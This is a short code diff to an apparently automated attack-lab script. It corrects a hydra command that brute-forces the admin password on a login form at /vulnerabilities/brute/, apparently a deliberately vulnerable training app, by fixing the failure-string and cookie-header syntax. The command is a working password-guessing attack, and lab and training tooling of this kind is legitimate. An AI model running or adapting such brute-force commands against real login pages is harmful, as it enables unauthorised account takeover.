@@ -83,8 +83,8 @@ ATTACK_PHASES = [
         "auto_cmd": (
             "hydra {victim_ip} http-get-form "
             "'/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login"
-            ":Username and/or password incorrect"
-            ":H=Cookie: PHPSESSID={phpsessid}; security=low' "
+            ":F=Username and/or password incorrect"
+            r":H=Cookie\: PHPSESSID={phpsessid}; security=low' "
             "-l admin -P /tmp/pass.txt"
         ),
     },
